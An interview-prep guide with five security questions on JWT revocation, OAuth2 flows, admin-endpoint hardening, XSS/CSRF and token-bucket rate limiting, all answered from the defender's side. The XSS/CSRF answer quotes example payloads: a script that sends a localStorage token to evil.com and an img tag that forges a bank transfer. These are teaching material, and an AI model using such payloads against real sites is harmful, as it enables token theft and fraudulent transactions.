# Security — SDE-2 Interview Questions

> [!abstract] Scenario-based questions testing trade-off reasoning around JWT revocation, OAuth2 flows, token storage, and securing sensitive API endpoints. Expected at SDE-2 level.

---

## Q1 — JWT Revocation Problem

> [!question] A user reports their account was compromised. You need to invalidate their JWT immediately. JWTs are stateless — how do you solve this?

> [!success]- Answer
>
> **The fundamental problem:**
> ```
> JWT is stateless — verified by signature, no DB lookup on every request
> Cannot "cancel" a JWT before it expires
>
> User reports compromise at 2pm
> Their access token expires at 2:15pm
> For 15 minutes: attacker can still use the stolen token
> ```
>
> **Option 1 — Token blacklist (short-term fix):**
> ```
> Store compromised token IDs in Redis with TTL = token expiry
>
> On every API request:
>   1. Verify JWT signature ✓
>   2. Check Redis: is this token ID blacklisted?
>      If yes → 401 Unauthorized
>      If no  → proceed
>
> Immediate revocation: add to blacklist → effective instantly ✓
>
> Trade-off:
>   Defeats stateless JWT advantage — now every request hits Redis
>   But Redis lookup is ~1ms → acceptable overhead
>   Blacklist size: only actively revoked tokens (not all tokens) → stays small
> ```
>
> **Option 2 — Short expiry + refresh token invalidation:**
> ```
> Access tokens: 15-minute expiry
>   → Maximum exposure: 15 minutes (if stolen)
>   → Delete refresh token in DB: attacker can't get new access tokens
>
> When user reports compromise:
>   Delete user's refresh token from DB
>   Attacker's current access token: expires in up to 15 minutes
>   No new access token can be obtained after that
>
>   Acceptable for most cases: 15-minute exposure window
>   Not acceptable for: financial fraud, admin access
> ```
>
> **Option 3 — Per-user token version counter:**
> ```
> users table: { user_id, token_version, ... }
>
> JWT payload includes: { user_id: 123, token_version: 5 }
>
> On every request:
>   1. Verify signature ✓
>   2. DB lookup: SELECT token_version FROM users WHERE id = 123
>   3. If JWT token_version < DB token_version → reject
>
> To revoke: UPDATE users SET token_version = token_version + 1 WHERE id = 123
>   → All existing tokens for this user are immediately invalid
>   → New login gets token_version = 6
>
> Trade-off: one DB lookup per request (like blacklist, but less Redis overhead)
> ```
>
> **Best approach for most systems:** short expiry (15 min) + refresh token deletion for immediate logical revocation. Add blacklist only for high-security scenarios.
>
> > [!tip] Interview framing
> > *"Pure stateless JWT cannot be revoked. Options: token blacklist in Redis (immediate, adds Redis lookup), short expiry + refresh token deletion (15-minute window, acceptable for most cases), or version counter in DB (immediate, one DB lookup per request). For compromise response, delete refresh token immediately — attacker's window is at most the access token's remaining lifetime."*

---

## Q2 — OAuth2 Flow for Third-Party Integration

> [!question] You're building a feature where users can import their GitHub repositories. Walk me through the OAuth2 flow and what you store.

> [!success]- Answer
>
> **The OAuth2 Authorization Code flow:**
>
> ```
> Step 1 — User initiates:
>   User clicks "Connect GitHub"
>   Your app redirects to GitHub:
>     https://github.com/login/oauth/authorize
>       ?client_id=your_app_id
>       &redirect_uri=https://yourapp.com/oauth/callback
>       &scope=repo:read
>       &state=random_nonce_abc123    ← CSRF protection
>
> Step 2 — User authorizes:
>   GitHub shows "Allow yourapp to read your repositories?"
>   User clicks Allow
>   GitHub redirects to your callback:
>     https://yourapp.com/oauth/callback
>       ?code=temp_auth_code_xyz
>       &state=random_nonce_abc123
>
> Step 3 — Server exchanges code for token:
>   Your backend calls GitHub:
>   POST https://github.com/login/oauth/access_token
>   Body: { code: temp_auth_code_xyz, client_secret: secret }
>
>   GitHub responds: { access_token: "ghp_xxx", scope: "repo:read" }
>
> Step 4 — Store and use:
>   Store access_token encrypted in your DB associated with user
>   Use it to call GitHub API on user's behalf
> ```
>
> **What to store (and how):**
> ```
> access_token: encrypted at rest (AES-256 via KMS)
>               Never in plaintext — if DB breached, tokens can't be used
>
> refresh_token (if GitHub provides one): also encrypted
>
> scope: what access was granted (repo:read, user:email, etc.)
>
> expires_at: when the access token expires
>
> github_user_id: link the OAuth identity to your user
> ```
>
> **Security validations:**
> ```
> state parameter verification:
>   Generate random nonce before redirect, store in session
>   Verify state in callback matches session → prevents CSRF attack
>   Attacker cannot forge a callback to your server
>
> Code is single-use:
>   auth code is exchanged for token once → GitHub invalidates after use
>   Replay attack not possible
>
> Keep client_secret server-side only:
>   Never in JavaScript, never in mobile apps
>   If leaked: attacker can exchange codes for tokens
> ```
>
> > [!tip] Interview framing
> > *"OAuth2: user authorizes at GitHub → GitHub gives temp code → your server exchanges code for access_token (with client_secret, server-side only). Verify state parameter to prevent CSRF. Store access_token encrypted at rest. Never expose client_secret to clients."*

---

## Q3 — Securing Sensitive Endpoints

> [!question] You have an admin API that allows exporting all user data. How do you secure it beyond basic JWT authentication?

> [!success]- Answer
>
> **Basic JWT auth is necessary but insufficient for admin APIs:**
> ```
> Problem 1: Any authenticated user with a valid JWT could call it
> Problem 2: Stolen admin token → complete data access
> Problem 3: No audit trail of who exported what
> Problem 4: Bulk export could exfiltrate entire user database
> ```
>
> **Defense in depth:**
>
> **1. Role-based access control (RBAC):**
> ```
> JWT payload: { user_id: 123, role: "admin" }
>
> Middleware:
>   Check JWT signature ✓
>   Check role = "admin" ✓ → else 403
>
>   Better: separate permission check, not role check
>   Permission: "can_export_user_data"
>   More granular, easier to audit, RBAC not ABAC
> ```
>
> **2. IP allowlist for admin endpoints:**
> ```
> Admin API only accessible from:
>   Company VPN IP range
>   Office IP addresses
>
>   Stolen admin token from home: rejected at IP check ✓
>   Attacker outside office network: can't reach endpoint at all ✓
> ```
>
> **3. Multi-factor authentication for admin operations:**
> ```
> Admin user logs in with password + JWT ✓
>
> Before accessing export endpoint:
>   Require additional MFA challenge
>   TOTP code (Google Authenticator) or push notification
>   Short-lived "elevated session" token (10 minutes)
>
>   Stolen JWT: attacker also needs physical MFA device ✓
> ```
>
> **4. Rate limiting and volume limits:**
> ```
> Admin export:
>   Max 1 export per hour per user
>   Max 10,000 records per export request
>   Export must specify a filter (not allowed: export ALL users)
>
>   Prevents: a single compromised admin account from exfiltrating entire DB
> ```
>
> **5. Audit logging:**
> ```
> Every admin API call logged:
>   who (user_id), what (endpoint, params), when (timestamp), from where (IP)
>
>   Immutable log: append-only, admins cannot delete their own audit entries
>   Alerts: exports over 1000 records trigger security team notification
> ```
>
> > [!tip] Interview framing
> > *"Layer defenses: RBAC (specific permission, not just 'is logged in'), IP allowlist (limit to company network), step-up MFA before sensitive operations, rate limits and record caps on exports, and immutable audit logging. Compromising a single JWT shouldn't expose all user data."*

---

## Q4 — XSS and CSRF

> [!question] Explain XSS and CSRF. If you store the JWT access token in localStorage, which attack does it enable? What's the safe alternative?

> [!success]- Answer
>
> **XSS — Cross-Site Scripting:**
> ```
> Attacker injects JavaScript into a page other users will view
>
> Malicious comment submitted: <script>fetch('evil.com?c=' + localStorage.token)</script>
>
> Your site renders this as HTML → script executes in victim's browser
> → victim's localStorage token sent to attacker's server
>
> Fix: escape all HTML output → "<script>" becomes "&lt;script&gt;"
>      Content-Security-Policy header → blocks inline script execution
> ```
>
> **CSRF — Cross-Site Request Forgery:**
> ```
> Attacker tricks victim into making an authenticated request to your site
>
> Evil website: <img src="https://bank.com/transfer?to=attacker&amount=1000">
> Victim visits evil site → browser automatically sends bank.com cookies → transfer executes
>
> Fix: CSRF token (unique per session, sent in request body)
>      SameSite cookie attribute → browser won't send cookie on cross-origin requests
> ```
>
> **localStorage + XSS = token theft:**
> ```
> localStorage is accessible by any JavaScript on the page
>
> If attacker injects JS (XSS):
>   const token = localStorage.getItem('access_token')
>   fetch('https://evil.com/steal?token=' + token)
>
>   → Attacker has your JWT → can impersonate you until expiry
> ```
>
> **Safe alternative — HttpOnly cookie for refresh token:**
> ```
> Access token:  in memory (JS variable, not localStorage)
>   → Only exists during session → cleared on page close
>   → XSS can't access it (it's not in storage, just in JS memory)
>   → Can still be stolen by XSS reading the variable directly... 
>      but attacker must be executing code when token is loaded
>
> Refresh token: HttpOnly cookie
>   → HttpOnly = browser sends it automatically, JS CANNOT read it at all
>   → XSS cannot steal it ✓
>   → CSRF protection needed (SameSite=Strict or CSRF token)
>
> Pattern:
>   User logs in → get short-lived access token (memory) + refresh token (HttpOnly cookie)
>   Access token expires → silently call /refresh → browser sends HttpOnly cookie automatically
>   → New access token → continue ✓
> ```
>
> > [!tip] Interview framing
> > *"localStorage is accessible to all JS on the page — XSS attack = token theft. Safe alternative: access token in memory (short-lived, lost on page close), refresh token in HttpOnly cookie (JS cannot read it at all). CSRF protection via SameSite cookie attribute."*

---

## Q5 — Rate Limiting Design

> [!question] Design a rate limiting system for a public API. The requirement: max 100 requests per minute per API key, with burst allowance of 20 extra requests.

> [!success]- Answer
>
> **Algorithm: Token Bucket**
> Token bucket handles burst naturally — better than fixed window for this requirement.
>
> ```
> Token bucket per API key:
>   Capacity: 120 tokens (100 normal + 20 burst)
>   Refill rate: 100 tokens per minute (1.67 tokens/second)
>
>   Each request: consume 1 token
>   If bucket empty: reject with 429
>
>   Burst: bucket starts full (120 tokens)
>          burst of 120 requests possible immediately
>          then refills at 100/min sustained rate
> ```
>
> **Redis implementation:**
> ```
> Key: rate_limit:{api_key}
> Value: current token count
> TTL: automatically clean up inactive keys
>
> On each request (Lua script, atomic):
>   current = GET rate_limit:{api_key}
>   IF current is nil: SET 119 (120 - 1 for this request), TTL=60 → ALLOW
>   IF current > 0:    DECR rate_limit:{api_key} → ALLOW
>   IF current = 0:    REJECT → 429 Too Many Requests
>
>   Refill: separate process or calculate elapsed time in the script
>           add tokens based on time since last request
> ```
>
> **Response headers (API best practice):**
> ```
> X-RateLimit-Limit: 100
> X-RateLimit-Remaining: 47
> X-RateLimit-Reset: 1735689600  (Unix timestamp when bucket refills to full)
> Retry-After: 23  (seconds until they can retry, on 429)
> ```
>
> **Edge cases:**
> ```
> Distributed rate limiter:
>   Multiple API servers → each checks Redis → centralized token bucket
>   Single Redis key per API key → consistent across all servers
>
> Redis failure:
>   Option A: fail open (allow requests) → no enforcement during Redis outage
>   Option B: fail closed (reject all) → disrupts legitimate users
>   Common choice: fail open with monitoring alert
>
> Different limits by tier:
>   Free tier:       100 req/min
>   Pro tier:      1,000 req/min
>   Enterprise:   10,000 req/min
>   Store tier in DB → load limit on auth → pass to rate limiter
> ```
>
> > [!tip] Interview framing
> > *"Token bucket handles burst naturally — bucket capacity = sustained rate + burst. Redis stores per-key token count. Lua script makes check-and-decrement atomic. Include rate limit headers so clients know their status and when to retry. Fail open on Redis outage to avoid disrupting legitimate users."*
